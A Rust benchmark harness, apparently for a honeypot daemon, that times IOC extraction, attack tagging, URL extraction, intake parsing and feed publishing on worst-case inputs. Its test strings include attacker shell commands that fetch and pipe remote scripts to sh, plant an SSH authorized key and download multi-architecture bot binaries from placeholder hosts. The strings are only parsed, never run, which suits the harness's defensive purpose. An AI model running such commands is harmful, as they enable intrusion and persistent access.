//! Cost of the synchronous steps the daemon runs on its async worker threads, on worst-case input.
//!
//! A tokio worker running one of these steps cannot poll any other task until it returns, so a step
//! that takes longer than a few milliseconds shows up as scheduling lag for everything sharing the
//! runtime (see `docs/operations/health-and-observability.md`, "Runtime scheduling lag"). This harness times each step directly on inputs
//! at the limits the daemon enforces (a 1 MiB log line, an 8 MiB intake batch, a 16 MiB captured
//! body) and flags every step over the budget.
//!
//! No database and no network: every step here is a pure function of its input, or a file write
//! into a scratch directory. Run it on the machine whose numbers matter (a release build; the
//! timings of a debug build are several times worse):
//!
//! ```text
//! cargo run --release --example cpu_budget -p propolis
//! ```
//!
//! The exit status is 0 whatever the numbers are: this is a measurement, not a gate. A step that is
//! over budget but already runs off the async workers is marked, so the report separates the steps
//! that still need moving from the ones that are fine to be slow.

use std::hint::black_box;
use std::time::{Duration, Instant};

use chrono::{TimeZone, Utc};
use sha2::{Digest, Sha256};

/// A step slower than this on an async worker is a candidate for `spawn_blocking`.
const BUDGET: Duration = Duration::from_millis(10);
const RUNS: usize = 7;

struct Row {
    name: String,
    input: String,
    median: Duration,
    worst: Duration,
    off_runtime: bool,
}

struct Report {
    rows: Vec<Row>,
}

impl Report {
    /// Times `step` `RUNS` times. `off_runtime` marks a step the daemon already runs under
    /// `spawn_blocking`, so being over budget is not a problem for it.
    fn measure<R>(
        &mut self,
        name: &str,
        input: &str,
        off_runtime: bool,
        mut step: impl FnMut() -> R,
    ) {
        black_box(step());
        let mut times: Vec<Duration> = (0..RUNS)
            .map(|_| {
                let started = Instant::now();
                black_box(step());
                started.elapsed()
            })
            .collect();
        times.sort();
        self.rows.push(Row {
            name: name.to_string(),
            input: input.to_string(),
            median: times[RUNS / 2],
            worst: times[RUNS - 1],
            off_runtime,
        });
    }

    fn print(&self) {
        println!(
            "{:<46} {:<34} {:>10} {:>10}  verdict",
            "step", "input", "median ms", "worst ms"
        );
        for r in &self.rows {
            let verdict = match (r.median > BUDGET, r.off_runtime) {
                (false, _) => "ok",
                (true, true) => "over budget, already off the async workers",
                (true, false) => "OVER BUDGET ON AN ASYNC WORKER",
            };
            println!(
                "{:<46} {:<34} {:>10.3} {:>10.3}  {verdict}",
                r.name,
                r.input,
                r.median.as_secs_f64() * 1e3,
                r.worst.as_secs_f64() * 1e3,
            );
        }
    }
}

/// Deterministic pseudo-random bytes, so runs are comparable.
fn noise(len: usize) -> Vec<u8> {
    let mut state = 0x9E37_79B9_7F4A_7C15u64;
    (0..len)
        .map(|_| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            (state >> 24) as u8
        })
        .collect()
}

fn repeat_to(unit: &str, len: usize) -> String {
    let mut s = unit.repeat(len / unit.len().max(1) + 1);
    s.truncate(len);
    s
}

/// The shapes of attacker text the extraction and tagging code is written against, each cut to
/// `len` bytes.
fn shell_texts(len: usize) -> Vec<(&'static str, String)> {
    vec![
        (
            "dropper",
            repeat_to(
                "cd /tmp; wget http://198.51.100.7/x.sh -O- | sh; chmod +x x; ./x; echo 'ssh-rsa AAAAB3NzaC1yc2E k' >> ~/.ssh/authorized_keys; ",
                len,
            ),
        ),
        (
            "url-dense",
            repeat_to("http://a1.example.com:8080/p/q?r=1 ", len),
        ),
        ("dollar-dense", "$".repeat(len)),
        ("authorization-dense", repeat_to("authorization: ", len)),
        ("hostname-dense", repeat_to("irc.a-b.example.org ", len)),
        ("word-dense", repeat_to("a ", len)),
        ("crypt-dense", repeat_to("$6$salt$", len)),
        ("nested-sh", repeat_to("sh -c 'sh -c \"sh -c ls\"'; ", len)),
    ]
}

fn main() {
    let mut report = Report { rows: Vec::new() };

    // --- Campaign indexer: per ledger event (crates/review/src/campaign/mod.rs, Batch::process) ---
    // Sensors cap a command at 1 KiB, the ATT&CK shell reader at 4 KiB, the SQL reader at 8 KiB.
    // 64 KiB is `MAX_ARTIFACT_TEXT_BYTES`, the most `ioc::extract` reads of anything; 1 MiB is the
    // ledger line limit, the most an event's command could ever be.
    for (len, label) in [(1024, "1 KiB"), (64 * 1024, "64 KiB"), (1 << 20, "1 MiB")] {
        for (shape, text) in shell_texts(len) {
            let input = format!("{shape} {label}");
            // The indexer analyses a line longer than 16 KiB off the async worker.
            let routed = len > 16 * 1024;
            report.measure("ioc::extract_from_command", &input, routed, || {
                review::ioc::extract_from_command(&text)
            });
            report.measure("attack::tag_command", &input, routed, || {
                review::attack::tag_command(&text)
            });
            report.measure("fingerprint::normalize", &input, routed, || {
                review::campaign::fingerprint::normalize(&text)
            });
            report.measure("ioc::redact_secrets", &input, false, || {
                review::ioc::redact_secrets(&text)
            });
        }
    }
    let sql = repeat_to("SELECT 'a;b', \"c\", /* x */ 1 FROM t WHERE u = $1; ", 8192);
    for sensor in ["postgres", "mysql", "mssql"] {
        report.measure("attack::tag_sql", &format!("{sensor} 8 KiB"), false, || {
            review::attack::tag_sql(sensor, &sql)
        });
    }
    let big_sql = repeat_to("SELECT 1; ", 1 << 20);
    report.measure("attack::tag_sql", "postgres 1 MiB", false, || {
        review::attack::tag_sql("postgres", &big_sql)
    });

    // --- Captured bodies (fetcher and the artifact scan) ---
    let loader = repeat_to(
        "for a in arm arm5 arm7 mips mpsl x86 ppc; do wget http://198.51.100.9/bins/$a -O b; done\nH=\"198.51.100.9\"\nU=\"http://$H/x\"\n",
        64 * 1024,
    );
    report.measure("fetcher::extract_urls", "loader 64 KiB", false, || {
        review::fetcher::extract::extract_urls(loader.as_bytes())
    });
    let poisoned = repeat_to("A=$A$A\nB=$B$B\nwget http://$A/$B\n", 64 * 1024);
    report.measure(
        "fetcher::extract_urls",
        "self-referencing 64 KiB",
        false,
        || review::fetcher::extract::extract_urls(poisoned.as_bytes()),
    );
    let body_16 = noise(16 << 20);
    let text_16: String = repeat_to("echo hello world; wget http://a.example.com/x\n", 16 << 20);
    report.measure("Sha256::digest (record_success)", "16 MiB", true, || {
        Sha256::digest(&body_16)
    });
    report.measure("upload_filter::decide", "noise 16 MiB", false, || {
        review::upload_filter::decide(&body_16)
    });
    let mut zip_like = b"PK\x03\x04".to_vec();
    zip_like.extend_from_slice(&body_16[..(16 << 20) - 4]);
    report.measure(
        "upload_filter::decide",
        "zip-prefixed 16 MiB",
        false,
        || review::upload_filter::decide(&zip_like),
    );
    report.measure(
        "ioc::artifact_text (scan_artifact)",
        "binary 16 MiB",
        true,
        || review::ioc::artifact_text(&body_16),
    );
    report.measure(
        "ioc::artifact_text (scan_artifact)",
        "text 16 MiB",
        true,
        || review::ioc::artifact_text(text_16.as_bytes()),
    );
    let (_, strings) = review::ioc::artifact_text(&body_16).expect("within the scan limit");
    report.measure(
        "ioc::extract_artifact_text",
        "strings of 16 MiB",
        true,
        || review::ioc::extract_artifact_text(&strings),
    );
    let strings_text = review::ioc::artifact_text(text_16.as_bytes())
        .expect("within the scan limit")
        .1;
    report.measure("ioc::extract_artifact_text", "text strings", true, || {
        review::ioc::extract_artifact_text(&strings_text)
    });

    let spool_dir = std::env::var_os("CPU_BUDGET_SCRATCH")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(std::env::temp_dir)
        .join(format!("cpu-budget-{}", std::process::id()));
    std::fs::create_dir_all(&spool_dir).expect("scratch directory");
    let spool = sensor_framework::QuarantineSpool::new(spool_dir.clone(), 16 << 20, u64::MAX / 2);
    let mut distinct = body_16.clone();
    let mut counter = 0u64;
    report.measure(
        "QuarantineSpool::store (record_success)",
        "16 MiB",
        true,
        || {
            // A new digest each run, so every run writes a file instead of finding a duplicate.
            counter += 1;
            distinct[..8].copy_from_slice(&counter.to_le_bytes());
            spool.store(&distinct)
        },
    );
    let _ = std::fs::remove_dir_all(&spool_dir);

    // --- Intake: one batch (crates/intake/src/runner.rs, run_batch; core-scoring batch.rs) ---
    let line = |command_len: usize| -> String {
        let event = sensor_wire::SensorEvent {
            v: sensor_wire::WIRE_VERSION,
            source_ip: "203.0.113.5".parse().unwrap(),
            wan_ip: None,
            sensor: "ssh".to_string(),
            signal_type: sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC.to_string(),
            protocol: sensor_wire::PROTO_TCP.to_string(),
            authenticated: true,
            observed_at: Utc.with_ymd_and_hms(2026, 10, 14, 12, 0, 0).unwrap(),
            metadata: serde_json::json!({
                "command": repeat_to("cd /tmp; wget http://198.51.100.7/x.sh | sh; ", command_len),
                "protocol_label": "ssh",
                "n": 1,
            }),
            sample: None,
            session_id: None,
            occurrence_id: None,
            reply: None,
        };
        serde_json::to_string(&event).unwrap()
    };
    for (command_len, count, label) in [
        (200, 1000, "1000 lines of ~0.3 KiB"),
        (1 << 20, 8, "8 lines of ~1 MiB (byte budget)"),
    ] {
        let one = line(command_len);
        let lines: Vec<String> = (0..count).map(|_| one.clone()).collect();
        report.measure("serde_json::from_str::<SensorEvent>", label, false, || {
            // Collected: `map(..).count()` over a slice iterator never runs the closure.
            lines
                .iter()
                .map(|l| serde_json::from_str::<sensor_wire::SensorEvent>(l).unwrap())
                .collect::<Vec<_>>()
        });
        let events: Vec<sensor_wire::SensorEvent> = lines
            .iter()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        report.measure("intake::convert_event", label, false, || {
            events
                .iter()
                .map(|e| intake::converter::convert_event(e.clone()).unwrap())
                .collect::<Vec<_>>()
        });
        // `core_scoring::hashing::chain_hash` hashes the previous hash plus a length-framed
        // encoding whose bulk is `serde_json::to_vec(metadata)`; it is private to core-scoring, so
        // this reproduces the two costs that dominate it. The append lock is held across it.
        report.measure("chain hash (metadata to_vec + sha256)", label, true, || {
            let mut prev = [0u8; 32];
            for e in &events {
                let mut h = Sha256::new();
                h.update(prev);
                h.update(serde_json::to_vec(&e.metadata).unwrap());
                prev = h.finalize().into();
            }
            prev
        });
        report.measure("metadata Value clone (INSERT binds)", label, false, || {
            events
                .iter()
                .map(|e| e.metadata.clone())
                .collect::<Vec<_>>()
        });
    }

    // The tailer's read of one byte-budget batch from a log already in the page cache; a cold
    // cache adds disk latency on top, which this does not measure.
    let scratch = std::env::var_os("CPU_BUDGET_SCRATCH")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(std::env::temp_dir)
        .join(format!("cpu-budget-log-{}", std::process::id()));
    std::fs::create_dir_all(&scratch).expect("scratch directory");
    let log_path = scratch.join("sensor.jsonl");
    let big_line = line(1 << 19);
    std::fs::write(
        &log_path,
        (0..16).map(|_| format!("{big_line}\n")).collect::<String>(),
    )
    .expect("scratch log");
    report.measure(
        "LogTailer::read_batch_bounded",
        "8 MiB budget, warm cache",
        true,
        || {
            let mut tailer = log_tailer::LogTailer::new(log_path.clone(), scratch.join("cursors"));
            let lines = tailer.read_batch_bounded(1000, 8 << 20);
            tailer.rewind_batch();
            lines.len()
        },
    );
    // The ops-monitor's spool walk (`conditions::malware::stale_spool_bodies`): list a spool
    // directory and stat every entry, on each tick.
    let spool_walk = scratch.join("spool");
    std::fs::create_dir_all(&spool_walk).expect("scratch spool");
    for i in 0..20_000u32 {
        std::fs::write(spool_walk.join(format!("{:064x}", u64::from(i) + 1)), b"x").unwrap();
    }
    report.measure(
        "ops spool walk (read_dir + stat)",
        "20000 files",
        true,
        || {
            std::fs::read_dir(&spool_walk)
                .unwrap()
                .flatten()
                .filter_map(|e| e.metadata().ok()?.modified().ok())
                .count()
        },
    );
    let _ = std::fs::remove_dir_all(&scratch);

    // --- Feed (crates/feed): publish renders every format and fsyncs, all synchronous ---
    let when = Utc.with_ymd_and_hms(2026, 10, 14, 12, 0, 0).unwrap();
    let entry = |i: u32| feed::FeedEntry {
        // Publishing refuses reserved ranges, so the synthetic addresses are counted up from a
        // block outside them; they exist only in this process and the scratch directory.
        source_ip: std::net::IpAddr::V4(std::net::Ipv4Addr::from(0x5A5A_0000 + i)),
        tier: Some(core_scoring::FeedTier::Standard),
        first_seen: when,
        last_seen: when,
        event_count: 10,
        distinct_categories: 2,
        categories: vec![
            "ssh_brute_force".to_string(),
            "honeypot_command_exec".to_string(),
        ],
        valid_from: when,
        valid_until: when + chrono::Duration::hours(24),
    };
    let publish_dir = std::env::var_os("CPU_BUDGET_SCRATCH")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(std::env::temp_dir)
        .join(format!("cpu-budget-feed-{}", std::process::id()));
    std::fs::create_dir_all(&publish_dir).expect("scratch directory");
    let exclusions = feed::ExclusionEngine::new(Vec::new(), Vec::new());
    let feed_config = feed::FeedConfig {
        windows: vec![("7d".to_string(), chrono::Duration::days(7))],
        ..feed::FeedConfig::default()
    };
    for n in [5_000u32, 50_000] {
        let entries: Vec<feed::FeedEntry> = (0..n).map(entry).collect();
        let snapshot = feed::FeedSnapshot {
            build_time: when,
            aggressive: Vec::new(),
            standard: entries.clone(),
            windows: vec![feed::WindowFeed {
                label: "7d".to_string(),
                retention: chrono::Duration::days(7),
                entries,
            }],
        };
        let out = publish_dir.join("feed");
        report.measure(
            "feed::Publisher::publish",
            &format!("{n} entries x2 files"),
            true,
            || feed::Publisher::publish(&snapshot, &out, &exclusions, &feed_config).unwrap(),
        );
        report.measure(
            "ExclusionEngine::is_excluded",
            &format!("{n} addresses"),
            false,
            || {
                snapshot
                    .standard
                    .iter()
                    .filter(|e| exclusions.is_excluded(e.source_ip))
                    .count()
            },
        );
    }
    let _ = std::fs::remove_dir_all(&publish_dir);

    report.print();
}
